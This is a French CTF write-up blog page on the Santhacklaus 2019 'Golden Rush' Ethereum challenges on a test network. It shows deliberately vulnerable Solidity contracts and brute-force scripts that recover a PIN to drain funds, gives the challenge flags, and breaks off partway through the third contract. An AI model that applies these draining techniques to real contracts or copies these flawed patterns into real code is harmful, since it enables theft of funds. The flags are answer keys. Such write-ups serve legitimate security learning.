@@ -1,0 +1,265 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>[Santhacklaus 2019] - Golden rush - Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)</title><meta name=Description content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta property="og:title" content="[Santhacklaus 2019] - Golden rush"><meta property="og:description" content="Level 1 - Donation GoldenRush is a set of challenges based on the Ethereum Blockchain technology where you will have to exploit vulnerable Smart Contracts. Your goal is to steal the money that I sent on it ! https://goldenrush.santhacklaus.xyz
+Chaque challenge &ldquo;Golden rush&rdquo; est un smart contract à déployer sur la blockchain de test &ldquo;Ropsten network&rdquo;.
+Mise en place de l&rsquo;environnement Pour faire les challenges de blockchain ou même ceux sur rootme, il faut ajouter l&rsquo;extension &ldquo;MetaMask&rdquo; dans son navigateur:"><meta property="og:type" content="article"><meta property="og:url" content="maki.bzh/writeups/santhacklaus2019goldenrush/"><meta property="og:image" content="/logo.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2019-12-22T21:57:40+08:00"><meta property="article:modified_time" content="2019-12-22T21:57:40+08:00"><meta property="og:site_name" content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/logo.png"><meta name=twitter:title content="[Santhacklaus 2019] - Golden rush"><meta name=twitter:description content="Level 1 - Donation GoldenRush is a set of challenges based on the Ethereum Blockchain technology where you will have to exploit vulnerable Smart Contracts. Your goal is to steal the money that I sent on it ! https://goldenrush.santhacklaus.xyz
+Chaque challenge &ldquo;Golden rush&rdquo; est un smart contract à déployer sur la blockchain de test &ldquo;Ropsten network&rdquo;.
+Mise en place de l&rsquo;environnement Pour faire les challenges de blockchain ou même ceux sur rootme, il faut ajouter l&rsquo;extension &ldquo;MetaMask&rdquo; dans son navigateur:"><meta name=application-name content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=apple-mobile-web-app-title content="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=maki.bzh/writeups/santhacklaus2019goldenrush/><link rel=prev href=maki.bzh/writeups/santhacklaus2019jacquiesheerhask/><link rel=next href=maki.bzh/writeups/hexpressofix2020/><link rel=stylesheet href=/maki.bzh/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload="this.onload=null,this.rel='stylesheet'"><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"[Santhacklaus 2019] - Golden rush","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"maki.bzh\/writeups\/santhacklaus2019goldenrush\/"},"image":["\/images\/Apple-Devices-Preview.png"],"genre":"writeups","keywords":"santhacklaus, ch3n4p4n, shutdown, ethereum, wallet, smart contract, metamask","wordcount":1313,"url":"maki.bzh\/writeups\/santhacklaus2019goldenrush\/","datePublished":"2019-12-22T21:57:40+08:00","dateModified":"2019-12-22T21:57:40+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":"\/lib\/images\/avatar.png"},"author":{"@type":"Person","name":"Maki"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/maki.bzh/posts/>Posts </a><a class=menu-item href=/maki.bzh/shorts/>Shorts </a><a class=menu-item href=/maki.bzh/offers/>Offers </a><a class=menu-item href=/maki.bzh/writeups/>Writeups </a><a class=menu-item href=/maki.bzh/tags/>Tags </a><a class=menu-item href=/maki.bzh/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=maki.bzh/ title="Maki's adventure | Internet of things, IoT, ICS, forensic, pentest, red team & more :)"><span class=header-title-pre><i class='far fa-kiss-wink-heart fa-fw' aria-hidden=true></i></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/maki.bzh/posts/ title>Posts</a><a class=menu-item href=/maki.bzh/shorts/ title>Shorts</a><a class=menu-item href=/maki.bzh/offers/ title>Offers</a><a class=menu-item href=/maki.bzh/writeups/ title>Writeups</a><a class=menu-item href=/maki.bzh/tags/ title>Tags</a><a class=menu-item href=/maki.bzh/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">[Santhacklaus 2019] - Golden rush</h1><div class=content id=content><h2 id=level-1---donation>Level 1 - Donation</h2><blockquote><p>GoldenRush is a set of challenges based on the Ethereum Blockchain technology where you will have to exploit vulnerable Smart Contracts. Your goal is to steal the money that I sent on it !
+<a href=https://goldenrush.santhacklaus.xyz target=_blank rel="noopener noreffer">https://goldenrush.santhacklaus.xyz</a></p></blockquote><p>Chaque challenge &ldquo;Golden rush&rdquo; est un smart contract à déployer sur la blockchain de test &ldquo;Ropsten network&rdquo;.</p><h3 id=mise-en-place-de-lenvironnement>Mise en place de l&rsquo;environnement</h3><p>Pour faire les challenges de blockchain ou même ceux sur rootme, il faut ajouter l&rsquo;extension &ldquo;MetaMask&rdquo; dans son navigateur:</p><blockquote><p><a href=https://metamask.io/ target=_blank rel="noopener noreffer">https://metamask.io/</a></p></blockquote><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_93e6798b872dcd61bab4e65f60860744.png data-srcset="/lib/images/writeups/2019_santhacklaus/goldenrush/upload_93e6798b872dcd61bab4e65f60860744.png, /lib/images/writeups/2019_santhacklaus/goldenrush/upload_93e6798b872dcd61bab4e65f60860744.png 1.5x, /lib/images/writeups/2019_santhacklaus/goldenrush/upload_93e6798b872dcd61bab4e65f60860744.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_93e6798b872dcd61bab4e65f60860744.png title=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_93e6798b872dcd61bab4e65f60860744.png></p><p>Lorsque l&rsquo;extension est correctement installée, il faut créer un compte en suivant les étapes de &ldquo;Create a wallet&rdquo;;</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_b55c44b8b1d46261b80f3c94c2d774be.png data-srcset="/lib/images/writeups/2019_santhacklaus/goldenrush/upload_b55c44b8b1d46261b80f3c94c2d774be.png, /lib/images/writeups/2019_santhacklaus/goldenrush/upload_b55c44b8b1d46261b80f3c94c2d774be.png 1.5x, /lib/images/writeups/2019_santhacklaus/goldenrush/upload_b55c44b8b1d46261b80f3c94c2d774be.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_b55c44b8b1d46261b80f3c94c2d774be.png title=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_b55c44b8b1d46261b80f3c94c2d774be.png></p><p>Quand le wallet est créé, il faut passer sur la blockchain &ldquo;Ropsten Test Network&rdquo;, une blockchain de test, où les ETH n&rsquo;ont aucunes valeurs.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_63489c0d2cf2ce2c6c74a64553dae6b7.png data-srcset="/lib/images/writeups/2019_santhacklaus/goldenrush/upload_63489c0d2cf2ce2c6c74a64553dae6b7.png, /lib/images/writeups/2019_santhacklaus/goldenrush/upload_63489c0d2cf2ce2c6c74a64553dae6b7.png 1.5x, /lib/images/writeups/2019_santhacklaus/goldenrush/upload_63489c0d2cf2ce2c6c74a64553dae6b7.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_63489c0d2cf2ce2c6c74a64553dae6b7.png title=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_63489c0d2cf2ce2c6c74a64553dae6b7.png></p><p>Pour résoudre les différents challenges, il faudra au minimum 1 ETH dans le wallet. Pour récupérer des ETH:</p><blockquote><p><a href=https://faucet.metamask.io/ target=_blank rel="noopener noreffer">https://faucet.metamask.io/</a></p></blockquote><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_a156d3e79a1cd08192253bce3c9350e3.png data-srcset="/lib/images/writeups/2019_santhacklaus/goldenrush/upload_a156d3e79a1cd08192253bce3c9350e3.png, /lib/images/writeups/2019_santhacklaus/goldenrush/upload_a156d3e79a1cd08192253bce3c9350e3.png 1.5x, /lib/images/writeups/2019_santhacklaus/goldenrush/upload_a156d3e79a1cd08192253bce3c9350e3.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_a156d3e79a1cd08192253bce3c9350e3.png title=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_a156d3e79a1cd08192253bce3c9350e3.png></p><p>L&rsquo;extension va apparaitre et il faudra accepter la transaction. Maintenant qu&rsquo;il y a au moins 1 ETH dans le wallet, il est temps de valider le challenge.</p><h3 id=etat-des-lieux>Etat des lieux</h3><p>On commence donc sur la première étape, l&rsquo;objectif est plutot simple: Voler l&rsquo;argent du smartcontract.</p><p>Pour cela, le code Solidity du contrat est donné:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pragma solidity &gt;=0.4.22 &lt;0.6.0;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>contract Donation {
+</span></span><span class=line><span class=cl>    uint256 public funds;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    constructor() public payable{
+</span></span><span class=line><span class=cl>        funds = funds + msg.value;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function() external payable {
+</span></span><span class=line><span class=cl>        funds = funds + msg.value;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    function getDonationsFromOwner(address _contractOwner) external {
+</span></span><span class=line><span class=cl>        require(keccak256(abi.encodePacked(address(this)))==keccak256(abi.encodePacked(_contractOwner)));
+</span></span><span class=line><span class=cl>        msg.sender.transfer(funds);
+</span></span><span class=line><span class=cl>        funds = 0;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>En lançant l&rsquo;instance, il y deux informations importantes:</p><ol><li>L&rsquo;adresse du contrat ;</li><li>L&rsquo;Application Binary Interface (ABI) du contrat, cette ABI sert à décrire le contrat.</li></ol><p>La fonction du contrat <code>getDonationsFromOwner(address _contractOwner)</code> attend donc une adresse en entrée, va vérifier qu&rsquo;il s&rsquo;agit bien de son adresse, et transférer les fonds.</p><h3 id=transférer-les-eth>Transférer les ETH</h3><p>Pour dialoguer avec les smartcontract, il existe le site:</p><blockquote><p><a href=https://www.myetherwallet.com target=_blank rel="noopener noreffer">https://www.myetherwallet.com</a></p></blockquote><p>Qui s&rsquo;interface vraiment bien avec l&rsquo;extension MetaMask. Pour commencer à intéragir avec le smart contract du challenge, il faut lui donner l&rsquo;adresse et son ABI:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_520c88a92da1b46cfe27e63d511936df.png data-srcset="/lib/images/writeups/2019_santhacklaus/goldenrush/upload_520c88a92da1b46cfe27e63d511936df.png, /lib/images/writeups/2019_santhacklaus/goldenrush/upload_520c88a92da1b46cfe27e63d511936df.png 1.5x, /lib/images/writeups/2019_santhacklaus/goldenrush/upload_520c88a92da1b46cfe27e63d511936df.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_520c88a92da1b46cfe27e63d511936df.png title=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_520c88a92da1b46cfe27e63d511936df.png></p><p>C&rsquo;est à ce moment là que <em>myetherwallet</em> sera en mesure de fournir une interface à l&rsquo;utilisateur pour dialoguer avec le contrat.</p><p>Pour valider l&rsquo;épreuve, il suffit de fournir à la fonction <code>getDonationsFromOwner()</code> l&rsquo;adresse du contrat:</p><blockquote><p>0x87f028059df3638b7184045682978Ed477637D72</p></blockquote><p>Et cliquer sur &ldquo;Write&rdquo; pour écrire sur la blockchain. A ce moment, une popup MetaMask va apparaitre pour valider la transaction:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_6ee5d2f438420272148c01e28dc0ade2.png data-srcset="/lib/images/writeups/2019_santhacklaus/goldenrush/upload_6ee5d2f438420272148c01e28dc0ade2.png, /lib/images/writeups/2019_santhacklaus/goldenrush/upload_6ee5d2f438420272148c01e28dc0ade2.png 1.5x, /lib/images/writeups/2019_santhacklaus/goldenrush/upload_6ee5d2f438420272148c01e28dc0ade2.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_6ee5d2f438420272148c01e28dc0ade2.png title=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_6ee5d2f438420272148c01e28dc0ade2.png></p><p>Lorsque la transaction est validée et terminée (il est possible de suivre la progression via l&rsquo;add on MetaMask), il est temps de récupérer le flag:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_7f4d8466b1182475ac8d805393e35090.png data-srcset="/lib/images/writeups/2019_santhacklaus/goldenrush/upload_7f4d8466b1182475ac8d805393e35090.png, /lib/images/writeups/2019_santhacklaus/goldenrush/upload_7f4d8466b1182475ac8d805393e35090.png 1.5x, /lib/images/writeups/2019_santhacklaus/goldenrush/upload_7f4d8466b1182475ac8d805393e35090.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_7f4d8466b1182475ac8d805393e35090.png title=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_7f4d8466b1182475ac8d805393e35090.png></p><h3 id=flag>Flag</h3><blockquote><p>SANTA{!!S0Lidi7y_BaSiCs!!}</p></blockquote><h2 id=level-2---piggybank>Level 2 - Piggybank</h2><table><thead><tr><th>Event</th><th>Auteur</th><th>Challenge</th><th>Category</th><th>Points</th><th>Solves</th></tr></thead><tbody><tr><td>Santhacklaus</td><td>ch3n4p4n</td><td>Golden rush 2</td><td>Blockchain</td><td>200</td><td>29</td></tr></tbody></table><blockquote><p>Steal the money stored in the contract.</p></blockquote><h3 id=etat-des-lieux-1>Etat des lieux</h3><p>Comme pour le premier, on a accès au code Solidity du SmartContract:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>pragma</span> <span class=nx>solidity</span> <span class=o>^</span><span class=mf>0.4</span><span class=p>.</span><span class=mi>21</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>contract</span> <span class=nx>PiggyBank</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>bool</span> <span class=kr>public</span> <span class=nx>isOwner</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>uint256</span> <span class=kr>public</span> <span class=nx>funds</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>bytes32</span> <span class=kr>private</span> <span class=nx>pinHash</span> <span class=o>=</span> <span class=mh>0x7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=nx>constructor</span><span class=p>()</span> <span class=kr>public</span> <span class=nx>payable</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>funds</span> <span class=o>=</span> <span class=nx>funds</span> <span class=o>+</span> <span class=nx>msg</span><span class=p>.</span><span class=nx>value</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=kd>function</span><span class=p>()</span> <span class=nx>external</span> <span class=nx>payable</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>funds</span> <span class=o>=</span> <span class=nx>funds</span> <span class=o>+</span> <span class=nx>msg</span><span class=p>.</span><span class=nx>value</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>unlockPiggyBank</span><span class=p>(</span><span class=nx>uint256</span> <span class=nx>pin</span><span class=p>)</span> <span class=nx>external</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>((</span><span class=nx>keccak256</span><span class=p>(</span><span class=nx>abi</span><span class=p>.</span><span class=nx>encodePacked</span><span class=p>(</span><span class=nx>uint8</span><span class=p>(</span><span class=nx>pin</span><span class=p>)))</span> <span class=o>==</span> <span class=nx>pinHash</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>        <span class=nx>isOwner</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>    
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>withdrawPiggyBank</span><span class=p>()</span> <span class=nx>external</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>require</span><span class=p>(</span><span class=nx>isOwner</span> <span class=o>==</span> <span class=kc>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>msg</span><span class=p>.</span><span class=nx>sender</span><span class=p>.</span><span class=nx>transfer</span><span class=p>(</span><span class=nx>funds</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>isOwner</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nx>funds</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>La fonction <code>withdrawPiggyBank()</code> est donc la fonction qui va transférer les fonds. Cependant, il faut que la variable <code>isOwner</code> soit à &ldquo;True&rdquo;. Pour passer cette variable à &ldquo;True&rdquo; il faut exécuter la fonction <code>unlockPiggyBank(uint256 pin)</code> avec un pin correspondant au hash keccak256 de &ldquo;PinHash&rdquo;.</p><h3 id=méthode-1-bruteforce-all-the-things-python-mode>Méthode 1: Bruteforce all the things (Python mode)</h3><p>Il faut savoir que keccak256 est un SHA3 256, sauf que le SHA3 de hashlib n&rsquo;est pas du tout le même algo. Pour avoir la bonne fonction de hashage, il faut utiliser la lib python <code>pysha3</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sha3</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>ENO</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sha3_keccak</span><span class=p>(</span><span class=n>x</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>sha3</span><span class=o>.</span><span class=n>keccak_256</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>m</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>m</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>256</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>tmp</span> <span class=o>=</span> <span class=n>sha3_keccak</span><span class=p>(</span><span class=n>ntos</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>tmp</span> <span class=o>==</span> <span class=s1>&#39;7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=méthode-2-bruteforce-all-the-things-js-mode>Méthode 2: Bruteforce all the things (JS mode)</h3><p>Au lieu d&rsquo;éviter de se casser la tête en python pour savoir SHA3 de hashlib est le même que celui utilisé dans les smart contracts, on va prendre les librairies natives utilisé par Solidity.</p><p>Pour cela, on va télécharger <code>web3-utils</code> en faisant <code>nmp i web3-utils</code> contenant la fonction qui nous intéresse ici qui est <code>soliditySha3</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>var utils = require(&#34;web3-utils&#34;);
+</span></span><span class=line><span class=cl>var key = &#39;0x7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c&#39;;
+</span></span><span class=line><span class=cl>for (var i = 0; i &lt; 256; i++) {
+</span></span><span class=line><span class=cl>    var elt = utils.soliditySha3({type:&#39;uint8&#39;,value: i}); 
+</span></span><span class=line><span class=cl>    if (elt === key) {
+</span></span><span class=line><span class=cl>	console.log(&#34;The key is:&#34;,i);
+</span></span><span class=line><span class=cl>	return
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><h3 id=flag-1>Flag</h3><blockquote><p>213</p></blockquote><p>Le pin secret est donc <code>213</code>, il ne reste plus qu&rsquo;à vérifier l&rsquo;état de la variable et transférer les fonds.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_bdbb3d1fd62b84123061b4f2dc0efa87.png data-srcset="/lib/images/writeups/2019_santhacklaus/goldenrush/upload_bdbb3d1fd62b84123061b4f2dc0efa87.png, /lib/images/writeups/2019_santhacklaus/goldenrush/upload_bdbb3d1fd62b84123061b4f2dc0efa87.png 1.5x, /lib/images/writeups/2019_santhacklaus/goldenrush/upload_bdbb3d1fd62b84123061b4f2dc0efa87.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_bdbb3d1fd62b84123061b4f2dc0efa87.png title=/lib/images/writeups/2019_santhacklaus/goldenrush/upload_bdbb3d1fd62b84123061b4f2dc0efa87.png></p><blockquote><p>SANTA{N0_M0R3_B4D_R4ND0MN3SS_PL3AZ}</p></blockquote><h2 id=level-3---gringotts>Level 3 - Gringotts</h2><table><thead><tr><th>Event</th><th>Auteur</th><th>Challenge</th><th>Category</th><th>Points</th><th>Solves</th></tr></thead><tbody><tr><td>Santhacklaus</td><td>ch3n4p4n</td><td>Golden rush 3</td><td>Blockchain</td><td>300</td><td>18</td></tr></tbody></table><blockquote><p>Steal the money stored in the contract.</p></blockquote><h3 id=etat-des-lieux-2>Etat des lieux</h3><p>Voici le code du Smart Contract:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pragma solidity &gt;=0.4.22 &lt;0.6.0;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>contract Gringotts {
+</span></span><span class=line><span class=cl>  mapping (address =&gt; uint) public sorceryAllowance;
+</span></span><span class=line><span class=cl>  uint public allowancePerYear;
+</span></span><span class=line><span class=cl>  uint public startStudyDate;
+</span></span><span class=line><span class=cl>  uint public numberOfWithdrawls;
+</span></span><span class=line><span class=cl>  uint public availableAllowance;
+</span></span><span class=line><span class=cl>  bool public alreadyWithdrawn;
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    constructor() public payable {
+</span></span><span class=line><span class=cl>        allowancePerYear = msg.value/10;     
+</span></span><span class=line><span class=cl>        startStudyDate = now;
+</span></span><span class=line><span class=cl>        availableAllowance = msg.value;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    modifier isEligible() {
+</span></span><span class=line><span class=cl>        require(now&gt;=startStudyDate + numberOfWithdrawls * 365 days);
